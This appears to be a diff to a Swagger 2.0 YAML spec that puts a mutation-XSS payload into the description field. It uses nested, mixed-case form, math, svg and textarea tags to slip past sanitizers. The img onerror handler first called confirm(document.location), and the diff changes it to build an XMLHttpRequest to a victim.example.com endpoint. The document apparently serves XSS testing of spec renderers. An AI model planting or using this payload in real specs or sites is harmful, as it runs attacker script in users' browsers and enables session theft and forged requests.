@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Example yaml.spec
-  description: <form><math><mtext></form><form><mglyph><SvG><mtext><textarea><path id="</textarea><imG/SrC/onx/OneRror=(confirm)(document.location)>"></FoRm>
+  description: <form><math><mtext></form><form><mglyph><SvG><mtext><textarea><path id="</textarea><imG/SrC/onx/OneRror="var/**/req=new/**/XMLHttpRequest();req.open('get','https://victim.example.com/endpoint',true);>"></FoRm>
 paths:
   /accounts:
     get:
